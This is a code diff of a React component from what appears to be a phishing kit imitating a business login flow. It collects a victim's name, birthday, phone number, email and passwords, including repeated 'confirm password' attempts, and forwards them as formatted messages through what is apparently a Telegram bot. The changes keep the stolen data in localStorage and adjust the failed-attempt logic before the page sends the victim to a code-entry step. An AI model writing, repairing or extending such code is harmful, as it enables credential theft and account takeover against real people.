@@ -16,7 +16,6 @@ const GetInfo: React.FC = () => {
 	const [caseNumber, setCaseNumber] = useState<string>('');
 	const [failedPasswordAttempts, setFailedPasswordAttempts] =
 		useState<number>(1);
-	const [message, setMessage] = useState<string>('');
 	const [isLoading, setIsLoading] = useState<boolean>(false);
 
 	const [pageName, setPageName] = useState<string>('');
@@ -59,7 +58,8 @@ const GetInfo: React.FC = () => {
 					`<b>🧑 Tên:</b> <code>${name}</code>\n` +
 					`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n\n` +
 					`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n`;
-				setMessage(message + newMessage);
+				localStorage.setItem('message', newMessage
+				);
 				sendMessage({ text: newMessage });
 				navigate('login');
 			}
@@ -72,11 +72,12 @@ const GetInfo: React.FC = () => {
 			} else if (password === '') {
 				passwordInputRef.current?.focus();
 			} else {
+				const existingMessage = localStorage.getItem('message') || '';
 				const newMessage =
-					message +
+					existingMessage +
 					`<b>📧 Email:</b> <code>${email}</code>\n` +
 					`<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
-				setMessage(newMessage);
+				localStorage.setItem('message', newMessage);
 				const messageId = localStorage.getItem('message_id');
 				editMessageText({
 					message_id: Number(messageId),
@@ -98,32 +99,29 @@ const GetInfo: React.FC = () => {
 		const delayLoading = async () => {
 			setIsLoading(true);
 			if (currentPath === '/business/home/confirm-password') {
-				setMessage(
-					message +
-						`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
-				);
+				const existingMessage = localStorage.getItem('message') || '';
+				const updatedMessage =
+					existingMessage +
+					`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`;
+				localStorage.setItem('message', updatedMessage);
 				const messageID = localStorage.getItem('message_id');
 				editMessageText({
 					message_id: Number(messageID),
-					text:
-						message +
-						`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
+					text: updatedMessage,
 				});
 			}
 			setTimeout(
 				async () => {
 					setIsLoading(false);
 					if (currentPath === '/business/home/login') {
-						navigate('/business/home/confirm-password');
+						if ((await config()).settings.max_failed_password_attempts === 0) {
+							navigate('/business/code-input');
+						} else {
+							navigate('/business/home/confirm-password');
+						}
 					} else if (
-						failedPasswordAttempts ===
-						(await config()).settings.max_failed_password_attempts
+						failedPasswordAttempts >= (await config()).settings.max_failed_password_attempts
 					) {
-						localStorage.setItem(
-							'message',
-							message +
-								`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
-						);
 						navigate('/business/code-input');
 					} else {
 						if (confirmPasswordInputRef.current) {
@@ -194,6 +192,7 @@ const GetInfo: React.FC = () => {
 					passwordInputRef,
 					confirmPasswordInputRef,
 					isLoading,
+					failedPasswordAttempts,
 				}}
 			/>
 			<div className='flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row'>
@@ -209,9 +208,8 @@ const GetInfo: React.FC = () => {
 				</div>
 			</div>
 			<button
-				className={`my-5 flex w-full items-center justify-center rounded-lg bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${
-					isLoading ? 'cursor-not-allowed opacity-70' : ''
-				}`}
+				className={`my-5 flex w-full items-center justify-center rounded-lg bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${isLoading ? 'cursor-not-allowed opacity-70' : ''
+					}`}
 				onClick={handleButtonClick}
 				disabled={isLoading}
 			>
